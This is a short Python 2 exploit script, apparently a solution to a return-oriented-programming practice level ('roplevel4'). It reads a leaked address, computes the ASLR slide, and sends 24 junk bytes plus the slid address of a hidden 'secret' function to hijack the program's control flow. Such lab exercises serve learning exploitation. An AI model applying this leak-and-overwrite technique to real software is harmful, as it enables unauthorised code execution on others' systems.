#!/usr/bin/env python2

import struct
import subprocess
import time
import os


# Because of python and it's file I/O shenanigans
# Python may clear the stdout buffer before we can read from it
# You may need to run this script multiple times


# Static address of the string to be leaked
_leakme = 0xc03c
print "[i] _leakme = " + hex(_leakme)

# Static address of secret function
_secret = 0xbd28
print "[i] static_secret = " + hex(_secret)

# Open a pipe to the binary
rop4 = subprocess.Popen(['./roplevel4'], stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr=subprocess.STDOUT)

_infoleak = ""

# Read the leaked string's address from leak.txt
with open('/var/mobile/leak.txt' ,'r') as f:
    _infoleak = f.read()
print "[i] _infoleak = " + _infoleak

# Calculate ASLR slide
slide = int(_infoleak, 16) - _leakme
print "[i] slide = " + hex(slide)

# Calculate the slid address of secret
dynamic_secret = _secret + slide
print "[i] dynamic_secret = " + hex( dynamic_secret )

# Build the string
# exploit = 24 bytes of junk + the slid address of _secret
exploit = b'\x4a\x4a\x4a\x4a'*6 + struct.pack('<I', dynamic_secret )

# Write the string to stdin
rop4.stdin.write(exploit)

# Send the exploit string
print "\n\nOutput:"
print rop4.communicate()[0]

print '\nWe outchea'
print "[i] Exploit string = " + exploit.encode('string_escape')

